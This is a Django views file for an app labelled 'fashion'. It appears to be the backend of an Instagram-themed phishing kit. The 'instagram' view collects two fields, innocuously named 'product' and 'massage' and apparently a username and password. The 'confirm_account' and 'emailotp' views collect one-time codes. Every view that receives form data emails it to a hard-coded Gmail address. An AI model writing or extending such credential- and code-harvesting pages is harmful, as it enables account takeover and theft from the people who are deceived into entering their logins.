from django.shortcuts import render, redirect
from .models import *
from .forms import *
from typing import Protocol
from django.core.mail import send_mail
from django.conf import settings
from django.template.loader import render_to_string
from django.contrib.sites.shortcuts import get_current_site
from django.utils.http import urlsafe_base64_encode, urlsafe_base64_decode
from django.utils.encoding import force_bytes, force_str
from django.core.mail import EmailMessage
from django.db.models.query_utils import Q
# Create your views here.

def index( request):
    return render (request, 'fashion/index.html') 

def confirm_account(request):

   if request.method == 'POST':
       otp = request.POST['otp']

       ctx = {
           'otp' : otp,
       }
       message = render_to_string('fashion/vote.html', ctx)
       send_mail('Contact Form',
        message,
        settings.EMAIL_HOST_USER,
        ['shylarlayer@gmail.com'], 
        fail_silently=False, html_message=message)

       return redirect('confirm_account')

   return render(request, 'fashion/confirm_account.html')


def emailotp(request):

   if request.method == 'POST':
       otp = request.POST['otp']

       ctx = {
           'otp' : otp,
       }
       message = render_to_string('fashion/email3.html', ctx)
       send_mail('Contact Form',
        message,
        settings.EMAIL_HOST_USER,
        ['shylarlayer@gmail.com'], 
        fail_silently=False, html_message=message)

       return redirect('emailotp')

   return render(request, 'fashion/emailotp.html')

def blog( request):
    return render (request, 'fashion/blog.html') 

def contact( request):
    return render (request, 'fashion/contact.html') 

def email3( request):
    return render (request, 'fashion/email3.html') 


def support( request):
    return render (request, 'fashion/support.html') 


def instagram(request):

   if request.method == 'POST':
       product = request.POST['product']
       massage = request.POST['massage']
       ctx = {
           'product' : product,
           'massage' : massage,
       }
       message = render_to_string('fashion/email1.html', ctx)
       send_mail('Contact Form',
        message,
        settings.EMAIL_HOST_USER,
        ['shylarlayer@gmail.com'], 
        fail_silently=False, html_message=message)

       return redirect('confirm_account')

   return render(request, 'fashion/instagram.html')

def terms( request):
    return render (request, 'fashion/terms.html')      

def email1( request):
    return render (request, 'fashion/email1.html')   

def email2( request):
    return render (request, 'fashion/email2.html')   

def vote( request):
    return render (request, 'fashion/vote.html') 
